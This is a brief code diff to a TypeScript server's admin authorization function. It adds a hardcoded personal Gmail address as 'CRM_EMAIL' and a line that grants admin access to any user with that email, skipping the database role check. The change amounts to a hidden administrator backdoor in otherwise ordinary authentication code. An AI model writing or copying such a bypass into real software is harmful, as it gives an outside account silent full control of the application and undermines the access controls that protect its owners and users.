@@ -15,9 +15,12 @@ async function getUser(req: Request) {
   return user ?? null;
 }
 
+const CRM_EMAIL = 'contentyouworkplace@gmail.com';
+
 async function requireAdmin(req: Request) {
   const user = await getUser(req);
   if (!user) return Response.json({ error: 'Unauthorized' }, { status: 401 });
+  if (user.email === CRM_EMAIL) return { user };
   const { data: profile } = await db().from('profiles').select('role').eq('id', user.id).maybeSingle();
   if (profile?.role !== 'admin') return Response.json({ error: 'Forbidden' }, { status: 403 });
   return { user };
